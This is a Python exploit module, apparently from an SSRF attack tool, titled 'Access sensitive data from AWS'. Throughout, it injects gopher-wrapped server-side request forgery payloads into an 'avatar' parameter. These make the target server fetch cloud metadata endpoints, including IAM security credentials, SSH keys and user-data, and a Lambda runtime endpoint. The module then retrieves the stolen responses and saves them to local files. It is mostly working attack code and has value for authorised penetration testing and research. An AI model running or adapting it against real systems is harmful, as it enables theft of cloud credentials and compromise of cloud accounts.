from core.utils import *
from core.requester import Requester
import json
import logging
import os
import re
import time

name          = "aws"
description   = "Access sensitive data from AWS"
author        = "Swissky"
documentation = [
    "https://hackerone.com/reports/53088",
    "https://hackerone.com/reports/285380",
    "https://blog.christophetd.fr/abusing-aws-metadata-service-using-ssrf-vulnerabilities/",
    "https://twitter.com/spengietz/status/1161317376060563456"
]

class exploit():
    endpoints = set()

    def __init__(self, requester, args):
        logging.info(f"Module '{name}' launched !")
        self.add_endpoints()

        # Get a baseline response from the original request file
        r = requester.do_request(args.param, "")
        if r != None:
            default = r.text

            # Create directory to store files
            directory = requester.host
            # Replace : with _ for window folder name safe
            # https://www.ibm.com/docs/en/spectrum-archive-sde/2.4.1.0?topic=tips-file-name-characters
            directory =  directory.replace(':','_')
            if not os.path.exists(directory):
                os.makedirs(directory)

            # Prepare proxies if provided in args
            proxies = None
            if hasattr(args, 'proxy') and args.proxy:
                proxies = {"http": args.proxy, "https": args.proxy}

            for endpoint in self.endpoints:
                # Build SSRF payload (step 1: inject into original request using gopher, do not write to file)
                # Some endpoints include a leading '_' in the data (e.g. '_GET ...') which results in
                # the remote server interpreting the verb as '_GET' (causes 400 InvalidHttpVerb).
                # Strip a leading '_' to ensure the server sees 'GET' instead of '_GET'.
                data = endpoint[1]
                if data.startswith('_'):
                    data = data[1:]
                payload = wrapper_gopher(data, endpoint[0] , endpoint[2])
                logging.debug(f"Original endpoint data: {endpoint[1]} -> using data: {data}")
                logging.debug(f"Injecting payload into avatar: {payload}")
                # Inject payload into the POST JSON parameter named 'avatar'
                r1  = requester.do_request('avatar', payload)

                # Wait briefly to ensure the server had time to process the injected value
                time.sleep(2)

                # Step 2: call examples/request2.txt to retrieve the page that contains the image URL
                try:
                    req2 = Requester(os.path.join('examples','request2.txt'), args.useragent if hasattr(args,'useragent') else None, args.ssl if hasattr(args,'ssl') else False, proxies)
                    r2 = req2.do_request('NOPE', '')
                except Exception as e:
                    logging.error(f"Unable to load or call request2.txt: {e}")
                    r2 = None

                if r2 is None:
                    logging.debug("No response from request2, skipping this endpoint")
                    continue

                # Extract path like /uploads/user/avatar/.... from the response
                logging.debug(f"Request2 raw response (snippet): {r2.text[:300]}")

                # Unescape JSON-encoded slashes (e.g. "http:\/\/host\/uploads\/...")
                body = r2.text
                try:
                    body_unescaped = body.replace('\\/', '/')
                except Exception:
                    body_unescaped = body

                # First attempt: regex on unescaped body
                m = re.search(r'(?:https?://[^/]+)?(/uploads/user/avatar/[^\s"\'<>]+)', body_unescaped)
                uploads_path = None
                if m:
                    uploads_path = m.group(1)
                else:
                    # Fallback: find all occurrences of the uploads path
                    finds = re.findall(r'(/uploads/user/avatar/[^\s"\'<>]+)', body_unescaped)
                    if finds:
                        uploads_path = finds[0]
                    else:
                        # Try to parse JSON and search values
                        try:
                            j = json.loads(body)
                            jstr = json.dumps(j)
                            finds = re.findall(r'(/uploads/user/avatar/[^\s"\'<>]+)', jstr)
                            if finds:
                                uploads_path = finds[0]
                        except Exception:
                            pass

                if not uploads_path:
                    logging.debug("No uploads path found in request2 response")
                    continue

                uploads_path = uploads_path.replace('\\/', '/')
                logging.info(f"Found uploads path: {uploads_path}")

                # Step 3: use examples/request3.txt to download the file located at the uploads path
                try:
                    req3 = Requester(os.path.join('examples','request3.txt'), args.useragent if hasattr(args,'useragent') else None, args.ssl if hasattr(args,'ssl') else False, proxies)
                    # Replace the action with the discovered path (request3.txt uses {url} in the first line)
                    req3.action = uploads_path
                    r3 = req3.do_request('NOPE', '')
                except Exception as e:
                    logging.error(f"Unable to load or call request3.txt: {e}")
                    r3 = None

                if r3 is None:
                    logging.debug("No response when requesting the uploads path")
                    continue

                # Save the content to file using the same filename extraction logic
                filename = uploads_path.split('/')[-1]
                if filename == "":
                    filename = uploads_path.split('/')[-2:-1][0]

                logging.info(f"\033[32mWriting file\033[0m : {uploads_path} to {directory + '/' + filename}")
                filepath = os.path.join(directory, filename)
                try:
                    # Always save the response body (raw bytes)
                    with open(filepath, 'wb') as f:
                        f.write(r3.content)

                    # Also save a raw HTTP representation (status + headers + body) for debugging
                    raw_path = filepath + '.raw'
                    try:
                        status_line = f"HTTP/1.1 {r3.status_code} {getattr(r3, 'reason', '')}\r\n"
                    except Exception:
                        status_line = f"HTTP/1.1 {getattr(r3, 'status_code', 'N/A')}\r\n"

                    headers_blob = ''.join([f"{k}: {v}\r\n" for k,v in r3.headers.items()])
                    with open(raw_path, 'wb') as rf:
                        rf.write(status_line.encode())
                        rf.write(headers_blob.encode())
                        rf.write(b"\r\n")
                        rf.write(r3.content)

                    if getattr(r3, 'status_code', None) and r3.status_code != 200:
                        logging.warning(f"Downloaded resource returned HTTP {r3.status_code}. Raw response saved to {raw_path}")

                except Exception as e:
                    logging.error(f"Failed to write file {filename}: {e}")


    def add_endpoints(self):
        self.endpoints.add( ("169.254.169.254","_GET%20/metadata/instance/compute%3Fapi-version%3D2021-02-01%26format%3Djson%20HTTP/1.1%0D%0AHost%3A%20169.254.169.254%0D%0AMetadata%3A%20true%0D%0AConnection%3A%20close%0D%0A%0D%0A", "80") )
        self.endpoints.add( ("169.254.169.254","user-data", "80") )
        self.endpoints.add( ("169.254.169.254","meta-data/ami-id", "80") )
        self.endpoints.add( ("169.254.169.254","meta-data/reservation-id", "80") )
        self.endpoints.add( ("169.254.169.254","meta-data/hostname", "80") )
        self.endpoints.add( ("169.254.169.254","meta-data/public-keys/0/openssh-key", "80") )
        self.endpoints.add( ("169.254.169.254","meta-data/public-keys/1/openssh-key", "80") )
        self.endpoints.add( ("169.254.169.254","meta-data/public-keys/2/openssh-key", "80") )
        self.endpoints.add( ("169.254.169.254","meta-data/iam/security-credentials/dummy", "80") )
        self.endpoints.add( ("169.254.169.254","meta-data/iam/security-credentials/ecsInstanceRole", "80") )
        self.endpoints.add( ("169.254.169.254","meta-data/iam/security-credentials/", "80") )
        self.endpoints.add( ("169.254.169.254","meta-data/public-keys/", "80") )
        self.endpoints.add( ("169.254.169.254","user-data/", "80") )
        self.endpoints.add( ("localhost","2018-06-01/runtime/invocation/next", "9001") )
